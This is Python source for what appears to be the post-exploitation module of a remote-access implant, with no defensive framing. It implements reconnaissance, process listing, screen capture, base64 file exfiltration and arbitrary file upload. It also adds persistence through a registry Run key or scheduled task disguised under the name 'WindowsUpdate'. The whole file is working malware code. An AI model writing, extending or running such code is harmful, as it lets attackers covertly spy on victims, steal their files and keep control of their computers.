def postex(command):
    import os, sys, base64, socket, getpass
    op = command[5:] if str(command).startswith('__px:') else command
    try:
        if op == 'ps':
            import subprocess
            if sys.platform == 'win32':
                out = subprocess.check_output(['tasklist', '/FO', 'CSV', '/NH'], text=True, timeout=15)
                return out[:8000]
            return subprocess.check_output(['ps', '-ax', '-o', 'pid,comm'], text=True, timeout=15)[:8000]
        if op == 'recon':
            host = socket.gethostname()
            user = getpass.getuser()
            cwd = os.getcwd()
            addrs = []
            try:
                addrs.append(socket.gethostbyname(host))
            except Exception:
                pass
            return 'host=%s user=%s cwd=%s addrs=%s' % (host, user, cwd, ','.join(addrs))
        if op == 'screenshot':
            return _postex_screenshot()
        if op.startswith('download:'):
            path = op.split(':', 1)[1]
            if not os.path.isfile(path):
                return 'Error: not a file'
            size = os.path.getsize(path)
            if size > 1024 * 1024:
                return 'Error: file too large'
            data = open(path, 'rb').read()
            return 'FILE:' + base64.b64encode(data).decode()
        if op.startswith('upload:'):
            rest = op.split(':', 1)[1]
            path, _, b64 = rest.rpartition(':')
            data = base64.b64decode(b64)
            if len(data) > 1024 * 1024:
                return 'Error: file too large'
            parent = os.path.dirname(path)
            if parent:
                os.makedirs(parent, exist_ok=True)
            with open(path, 'wb') as fh:
                fh.write(data)
            return 'uploaded %d bytes' % len(data)
        if op.startswith('persist:'):
            method = op.split(':', 1)[1]
            return _postex_persist(method)
        if op == 'persist':
            return _postex_persist('')
        return 'Error: unknown postex op'
    except Exception as exc:
        return 'Error: %s' % exc


def _postex_screenshot():
    import sys, base64, io
    if sys.platform == 'win32':
        try:
            import ctypes
            from ctypes import wintypes
            user32 = ctypes.windll.user32
            gdi32 = ctypes.windll.gdi32
            w = user32.GetSystemMetrics(0)
            h = user32.GetSystemMetrics(1)
            hdc_screen = user32.GetDC(0)
            hdc_mem = gdi32.CreateCompatibleDC(hdc_screen)
            hbmp = gdi32.CreateCompatibleBitmap(hdc_screen, w, h)
            gdi32.SelectObject(hdc_mem, hbmp)
            gdi32.BitBlt(hdc_mem, 0, 0, w, h, hdc_screen, 0, 0, 0x00CC0020)
            class BITMAPINFOHEADER(ctypes.Structure):
                _fields_ = [('biSize', wintypes.DWORD), ('biWidth', ctypes.c_long),
                            ('biHeight', ctypes.c_long), ('biPlanes', wintypes.WORD),
                            ('biBitCount', wintypes.WORD), ('biCompression', wintypes.DWORD),
                            ('biSizeImage', wintypes.DWORD), ('biXPelsPerMeter', ctypes.c_long),
                            ('biYPelsPerMeter', ctypes.c_long), ('biClrUsed', wintypes.DWORD),
                            ('biClrImportant', wintypes.DWORD)]
            bi = BITMAPINFOHEADER()
            bi.biSize = ctypes.sizeof(BITMAPINFOHEADER)
            bi.biWidth = w
            bi.biHeight = -h
            bi.biPlanes = 1
            bi.biBitCount = 24
            bi.biCompression = 0
            row_size = ((w * 3 + 3) & ~3)
            bi.biSizeImage = row_size * h
            buf = ctypes.create_string_buffer(bi.biSizeImage)
            gdi32.GetDIBits(hdc_mem, hbmp, 0, h, buf, ctypes.byref(bi), 0)
            bmp_header = b'BM' + (14 + 40 + bi.biSizeImage).to_bytes(4, 'little')
            bmp_header += b'\x00\x00\x00\x00' + (14 + 40).to_bytes(4, 'little')
            bmp_header += bytes(bi)
            data = bmp_header + buf.raw
            gdi32.DeleteObject(hbmp)
            gdi32.DeleteDC(hdc_mem)
            user32.ReleaseDC(0, hdc_screen)
            return 'SCREENSHOT:' + base64.b64encode(data).decode()
        except Exception as e:
            return 'Error: screenshot failed: %s' % e
    return 'Error: screenshot not supported on this platform'


def _postex_persist(method):
    import sys, os
    if sys.platform != 'win32':
        return 'Error: persist only supported on Windows'
    method = method.strip().lower() or 'registry'
    if method == 'reg':
        method = 'registry'
    try:
        agent_path = os.path.abspath(sys.argv[0])
        if method == 'remove':
            removed = []
            try:
                import winreg
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                    r'Software\Microsoft\Windows\CurrentVersion\Run',
                                    0, winreg.KEY_SET_VALUE)
                try:
                    winreg.DeleteValue(key, 'WindowsUpdate')
                    removed.append('registry')
                except FileNotFoundError:
                    pass
                winreg.CloseKey(key)
            except Exception:
                pass
            try:
                import subprocess
                subprocess.run(['schtasks', '/delete', '/tn', 'WindowsUpdate', '/f'],
                               capture_output=True, timeout=15)
                removed.append('schtask')
            except Exception:
                pass
            if removed:
                return 'Persistence removed: %s' % ', '.join(removed)
            return 'No persistence found to remove'
        if method == 'registry':
            import winreg
            py_exe = sys.executable
            if not os.path.isfile(agent_path):
                return 'Error: agent path not found: %s' % agent_path
            key = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER,
                                     r'Software\Microsoft\Windows\CurrentVersion\Run',
                                     0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, 'WindowsUpdate', 0, winreg.REG_SZ,
                              f'"{py_exe}" "{agent_path}"')
            winreg.CloseKey(key)
            return 'Persistence installed via registry Run key'
        if method == 'schtask':
            import subprocess
            subprocess.run([
                'schtasks', '/create', '/tn', 'WindowsUpdate',
                '/tr', f'pythonw.exe "{agent_path}"',
                '/sc', 'onlogon', '/f'
            ], capture_output=True, timeout=15)
            return 'Persistence installed via scheduled task'
        return 'Error: unknown persist method (use: reg, registry, schtask, remove)'
    except Exception as e:
        return 'Error: persist failed: %s' % e
